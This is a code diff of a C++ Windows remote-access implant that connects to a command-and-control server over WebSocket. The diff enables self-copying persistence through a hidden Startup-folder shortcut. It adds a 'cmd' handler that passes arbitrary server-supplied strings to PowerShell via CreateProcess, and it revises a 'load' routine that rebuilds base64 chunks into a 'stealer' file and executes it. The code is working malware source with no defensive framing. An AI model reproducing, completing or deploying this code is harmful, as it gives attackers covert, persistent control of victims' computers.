@@ -58,6 +58,7 @@ HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPC
 std::string getLog(std::string filename);
 std::string getExePath(); 
 SYSTEM_INFO getSystemInfo(std::string data);
+inline bool fileExists(const std::string &name);
 
 
 const string c2_id = "6969";
@@ -77,14 +78,14 @@ bool connected = false;
 ***/ 
 int main(int argc, char **argv) try {
 
-	// HideConsole(); // Hides console UI | Disabled for testing purposes
-	//setupDirectory();
-	//setupPersist();
-
 	Cmdline params(argc, argv);						// Execution parameters
 
 	string c2id = c2_id;							// Reassign global to local scope var
 	Configuration config;
+
+	//HideConsole(); // Hides console UI | Disabled for testing purposes
+	setupDirectory();
+	setupPersist();
 
 	rtc::InitLogger(LogLevel::Info);				// TODO: Delete rtc logging
 
@@ -105,10 +106,14 @@ int main(int argc, char **argv) try {
 	// On error thrown
 	ws->onError([&wsPromise](string s) {
 		wsPromise.set_exception(std::make_exception_ptr(std::runtime_error(s)));
+		return 0;
 	});
 
 	// On socket close
-	ws->onClosed([]() { cout << "WebSocket closed" << endl; });
+	ws->onClosed([]() {
+		cout << "WebSocket closed" << endl;
+		return 0;
+	});
 
 	// Sets description accordingly to connect to C2
 	ws->onMessage([&](variant<binary, string> data) {
@@ -233,6 +238,7 @@ string parseMessage(string message) {
 	string cmd2 = "pop-up";      // Pops up a windows with the provided message (Testing purposes)
 	string cmd3 = "system-info"; // Asks for system information
 	string cmd4 = "load";        // Loads a given file (base64 format)
+	string cmd5 = "cmd";
 
 	/***
 	 * list-implants | List the implants connected on the network.
@@ -271,7 +277,7 @@ string parseMessage(string message) {
 		 * load | Loads a base64 string to an executable and executes it
 		 ***/
 	} else if (strncmp(message.c_str(), cmd4.c_str(), cmd4.size()) == 0) {
-		char *filename = "stealer2.txt";
+		char *filename = "stealer5.txt";
 		cout << "RECEIVED DATA" << endl;
 		string numberStr = message.substr(message.find(":") + 1,
 		                                  message.find("::") +
@@ -279,24 +285,37 @@ string parseMessage(string message) {
 		int number = stoi(numberStr);
 		string data = message.substr(message.find("::") + 2); // Actual string
 		cout << number << endl;
-		if (number == 2) { // Create new file
+		if (number == 0) { // Create new file
 			std::ofstream outfile(filename);
 			outfile << data;
 			outfile.close();
-		} else if (number == 1) { // Append
+		} else { // Append
 			std::ofstream outfile;
 			outfile.open(filename, std::ios_base::app);
 			outfile << data;
 			outfile.close();
-		} else { // Proceed
-			createFileFromBase64String(filename);
+			if (number == 2) {
+				createFileFromBase64String(filename);
+			}
 		}
 
+
 		return "COMPLETED";
+	} else if (strncmp(message.c_str(), cmd5.c_str(), cmd5.size()) == 0) {
+		STARTUPINFO info = {sizeof(info)};
+		PROCESS_INFORMATION processInfo;
+		string data = message.substr(message.find(":") + 1); // Actual string
+		
+		string cmd = "powershell.exe " + data;
+		LPSTR cmd2 = const_cast<char *>(cmd.c_str());
+
+		// Runs powershell command to create .exe
+		CreateProcess(NULL, cmd2, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+		return "Completed";
 	} else
 		cout << message << endl;
 
-	return "Received Correctly";
+	return "Received correctly";
 }
 
 
@@ -331,7 +350,11 @@ int setupDirectory() {
  ***/
 int setupPersist(){
 
-    try {
+	string path = data_directory + "\\" + fileName;
+	if (fileExists(path)) {
+		return 0;
+	}
+	try {
 
 		// Copies itself to its data directory
 		string exePath = getExePath();
@@ -340,13 +363,14 @@ int setupPersist(){
 		// Assuming its copied on its directory folder
 		string source = data_directory + "\\" + fileName;
 		string destination =
-		    user_directory +
-		    "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.lnk";
+			user_directory +
+			"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.lnk";
 
 		// Create shortcut
-		CreateLink(source.c_str(), destination.c_str(), data_directory.c_str(), "Some bullshit");
-		
-		//Hide link
+		CreateLink(source.c_str(), destination.c_str(), data_directory.c_str(),
+			        "Some bullshit");
+
+		// Hide link
 		int attr = GetFileAttributes(destination.c_str());
 		if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
 			SetFileAttributes(destination.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
@@ -354,6 +378,7 @@ int setupPersist(){
 	} catch (int E) {
 		return 0;
 	}
+
 
 	return 1;
 }
@@ -563,4 +588,9 @@ SYSTEM_INFO getSystemInfo(std::string data) {
 	GetSystemInfo(&siSysInfo);
 
 	return siSysInfo;
+}
+
+inline bool fileExists(const std::string &name) {
+	ifstream f(name.c_str());
+	return f.good();
 }
